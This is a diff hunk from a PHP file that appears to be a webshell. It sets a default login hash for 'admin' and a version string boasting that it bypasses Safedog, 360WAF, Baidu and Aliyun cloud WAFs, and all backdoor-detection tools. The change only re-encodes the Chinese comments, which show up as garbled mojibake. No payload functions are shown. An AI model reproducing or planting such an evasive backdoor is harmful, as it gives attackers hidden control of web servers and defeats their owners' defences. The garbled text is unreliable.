@@ -3,8 +3,8 @@ error_reporting(E_ERROR);
 header("content-Type: text/html; charset=gb2312");
 ini_set('max_execution_time',100000);
 ini_set('memory_limit','256M');
-define('PASSWD','21232f297a57a5a743894a0e4a801fc3');/*Ä¬ÈÏÊÇadmin£¬MD5¼ÓÃÜ·½Ê½*/
-define('VERSION','Bypass Waf Php Script(¿ÉÈÆ¹ý°²È«¹·¡¢360WAF¡¢°Ù¶ÈÔÆ¡¢°¢ÀïÔÆWaf¡¢Å£¶Ü¡¢ÔÆ¶Ü¡¢ÒÔ¼°ÀäÃÅWaf¡¢ÊÐÃæËùÓÐºóÃÅ¼ì²â¹¤¾ß');
+define('PASSWD','21232f297a57a5a743894a0e4a801fc3');/*é»˜è®¤æ˜¯adminï¼ŒMD5åŠ å¯†æ–¹å¼*/
+define('VERSION','Bypass Waf Php Script(å¯ç»•è¿‡å®‰å…¨ç‹—ã€360WAFã€ç™¾åº¦äº‘ã€é˜¿é‡Œäº‘Wafã€ç‰›ç›¾ã€äº‘ç›¾ã€ä»¥åŠå†·é—¨Wafã€å¸‚é¢æ‰€æœ‰åŽé—¨æ£€æµ‹å·¥å…·');
 define('THISFILE',str_replace(array('\\','//'),array('/','/'),__FILE__));
 define('THISDIR',dirname(THISFILE).'/');
 define('ROOTDIR',strtr(THISFILE,array($_SERVER['PHP_SELF'] => '')).'/');
